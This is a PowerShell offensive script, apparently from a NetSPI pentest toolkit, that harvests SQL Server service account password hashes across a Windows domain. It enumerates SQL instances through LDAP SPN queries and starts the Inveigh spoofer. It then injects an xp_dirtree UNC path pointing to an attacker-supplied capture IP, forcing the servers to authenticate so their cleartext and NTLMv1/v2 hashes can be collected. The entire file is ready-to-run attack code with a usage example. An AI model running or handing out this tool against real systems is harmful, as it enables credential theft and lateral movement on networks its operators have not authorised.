# author: scott sutherland (@_nullbind), NetSPI 2016
# script name: Get-SQLServiceAccountPwHash.ps1
# requirements: import-module powerupsql.psm1 (https://github.com/nullbind/Powershellery/blob/master/Stable-ish/MSSQL/PowerUpSQL.psm1);import-module invoke-inveigh.ps1;import-module Inveigh-Relay.ps1 (https://github.com/Kevin-Robertson/Inveigh)
# Note: use for alt domain user: runas /noprofile /netonly /user:domain\users powershell.exe
# Example: .\Get-SQLServiceAccountPwHash.ps1 -username domain\user -password SuperPassword! -domaincontroller 10.0.0.1
#import-module .\powerupsql.psm1
#import-module .\inveigh.ps1

[CmdletBinding()]
Param(
  [Parameter(Mandatory=$false)]
   [string]$username,
	
   [Parameter(Mandatory=$false)]
   [string]$password,

   [Parameter(Mandatory=$false)]
   [string]$domaincontroller,

   [Parameter(Mandatory=$true)]
   [string]$captureip,

   [Parameter(Mandatory=$false)]
   [int]$timeout = 5
)
 
# Discover SQL Servers on the Domain via LDAP queries for SPN records
Write-output "Testings access to domain sql servers..."
$SQLServerInstances = Get-SQLInstanceDomain -verbose -CheckMgmt -DomainController $domaincontroller -Username $username -Password $password | Get-SQLConnectionTestThreaded -Verbose -Threads 15 
$SQLServerInstancesCount = $SQLServerInstances.count
Write-output "$SQLServerInstancesCount MSSQL SPNs found"
$SQLServerInstances

# Get list of SQL Servers that the provided account can log into
Write-output "Attacking each one..."
$AccessibleSQLServers = $SQLServerInstances | ? {$_.status -eq "Accessible"}
$AccessibleSQLServers

# Perform unc path injection on each one
Write-output "Attacking accessible SQL Servers..."
$AccessibleSQLServers | 
ForEach-Object{
    
    # Get current instance ip
    $CurrentInstanceComputer = $_.ComputerName
    $CurrentInstanceIP = Resolve-DnsName $CurrentInstanceComputer| select IPaddress -ExpandProperty ipaddress
    $CurrentInstance = $_.Instance        

    Write-Output "$CurrentInstance ($CurrentInstanceIP) - START"
    Write-Output "$CurrentInstance ($CurrentInstanceIP) - Starting sniffer"

    # Start the sniffing
    Invoke-Inveigh -SpooferHostsReply $CurrentInstance -NBNS Y -MachineAccounts Y -WarningAction SilentlyContinue | Out-Null 

    # Start unc path injection for each interface
    Write-Output "$CurrentInstance ($CurrentInstanceIP) - Injecting UNC path"

    <# use local ips 
    Get-NetIPAddress | Select-Object ipaddress | 
    %{ 
        $IP = $_.IPAddress
        $IP
        Get-SQLQuery -Instance $CurrentInstance -Query "xp_dirtree '\\$IP\path'" -Verbose
    } #>

    Get-SQLQuery -Instance $CurrentInstance -Query "xp_dirtree '\\$captureip\path'" -Verbose
     
    # Sleep to give the SQL Server time to connect to us
    sleep $timeout

    # Stop sniffing
    Write-Output "$CurrentInstance ($CurrentInstanceIP) - Stopping sniffer"
    Stop-Inveigh | Out-Null 
 
    # Get hashes
    Write-Output "$CurrentInstance ($CurrentInstanceIP) - Checking for captured password hashes"
    Get-InveighCleartext 
    Get-InveighNTLMv1
    Get-InveighNTLMv2

    # Clear memory
    Write-Output "$CurrentInstance ($CurrentInstanceIP) - Cleaning up"
    Clear-Inveigh | Out-Null 

    Write-Output "$CurrentInstance ($CurrentInstanceIP) - END"
}



